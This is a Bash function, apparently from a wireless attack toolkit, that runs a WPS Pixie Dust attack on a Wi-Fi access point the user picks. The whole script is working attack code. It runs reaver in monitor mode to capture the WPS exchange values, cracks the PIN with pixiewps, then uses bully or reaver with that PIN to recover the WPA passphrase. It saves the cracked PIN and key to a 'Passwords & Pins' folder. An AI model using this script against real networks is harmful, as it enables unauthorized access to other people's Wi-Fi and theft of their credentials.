
function ataqueManual() {
	trap - SIGINT SIGQUIT SIGTSTP
	VerMon=$(iwconfig 2>&1 | grep 'Mode:Monitor')
	VerCar=$(iwconfig 2>&1 | grep '802.11' | wc -l)
	Ver_Mon_WCar_Fun
	if [ "$VerMon" != "" ]; then
		Ver_Mon_Fun
		echo -ne '\033c'
		echo ""
		echo -e "$White   [+]$Green Fill in all the blanks :"
		echo ""
		echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
		read BSSID
		echo ""
		echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
		read CHANNEL
		echo ""
		for ((c = 0; c <= 3; c++)); do
			echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you capture$Green the required arguments$White,GooD LucK"
			sleep 1
		done
		echo "" >${Temporary}/empty.txt
		reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -P -s ${Temporary}/empty.txt
		echo ""
		echo -e -n "$Cyan [+]$Yellow PKE : $Green"
		read PKE
		echo -e -n "$Cyan [+]$Yellow PKR : $Green"
		read PKR
		echo -e -n "$Cyan [+]$Yellow E-Hash1 : $Green"
		read E_Hash1
		echo -e -n "$Cyan [+]$Yellow E-Hash2 : $Green"
		read E_Hash2
		echo -e -n "$Cyan [+]$Yellow AuthKey : $Green"
		read AuthKey
		echo -e -n "$Cyan [+]$Yellow E-Nonce : $Green"
		read E_Nonce
		echo -e -n "$Cyan [+]$Yellow R-Nonce : $Green"
		read R_Nonce
		if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]; then
			trap kill_load SIGINT
			pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt >/dev/null &
			PID="$!"
			Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
			End_Msg="Cracking process is done , the $Green Result$White is as follows :"
			Loading
			echo " [+] ESSID      >> $ESSID" >${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
			echo " [+] BSSID      >> $BSSID" >>${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
			echo " [+] Channel    >> $CHANNEL" >>${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
			#pixiewps -v 3 -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/${BSSID}.txt | head -n 11 | tail -n 9
			PIN=$(less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}')
			time_taken=$(less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-)
			if [ "$PIN" != "" ]; then
				echo " [+] PIN        >> \"$PIN\"" >>${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
				echo ""
				echo -e "${White}       [+] PIN  >>${Green} $PIN"
				echo -e "${White}       [+] Time taken >>${Red} $time_taken"
				echo ""
				echo -e -n "$Cyan         [+]$Yellow PIN : $White"
				read PIN
				hash bully 2>/dev/null
				hash_bully="$?"
				if [ $hash_bully -eq 0 ]; then
					echo ""
					echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
					echo ""
					bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon >${Temporary}/Get_Pass.txt 2>/dev/null &
					PID="$!"
					Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
					End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
					Loading
					Key=$(cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}')
					echo " [+] Key        >> \"$Key\"" >>${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
				else
					echo ""
					echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
					echo ""
					reaver -i $mon -b $BSSID -c $CHANNEL -e -n -vv -p $PIN >${Temporary}/Get_Pass.txt &
					PID="$!"
					Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
					End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
					Loading
					Key=$(cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}')
					echo " [+] Key        >> \"$Key\"" >>${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
				fi
			else
				echo ""
				echo -e "$Red [!]$White Sorry pin not found,good luck next time."
				echo ""
				rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
			fi
		else
			echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
			echo ""
		fi
	fi
}
